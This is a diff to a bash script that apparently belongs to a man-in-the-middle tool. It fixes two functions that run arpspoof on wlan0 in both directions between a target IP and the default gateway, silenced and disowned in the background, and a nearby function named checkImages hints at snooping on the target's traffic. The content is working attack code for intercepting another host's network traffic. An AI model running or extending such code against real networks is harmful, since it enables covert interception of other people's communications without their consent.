@@ -65,15 +65,15 @@ function trafficSelectedIp {
 
 function interceptPackages {
   printf "Intercepting pacakages\n\n"
-  cmd= "arpspoof -i wlan0 -t "$targetIPAddress" "$defaultGateway 
+  cmd="arpspoof -i wlan0 -t "$targetIPAddress" "$defaultGateway
 
-  $cmd &
+  eval "${cmd}" &>/dev/null &disown
 }
 
 function inverseInterceptPackages {
-  cmd2= "arpspoof -i wlan0 -t "$defaultGateway" "$targetIPAddress
+  cmd2="arpspoof -i wlan0 -t "$defaultGateway" "$targetIPAddress
 
-  $cmd2 &
+  eval "${cmd2}" &>/dev/null &disown
 }
 
 function checkImages {
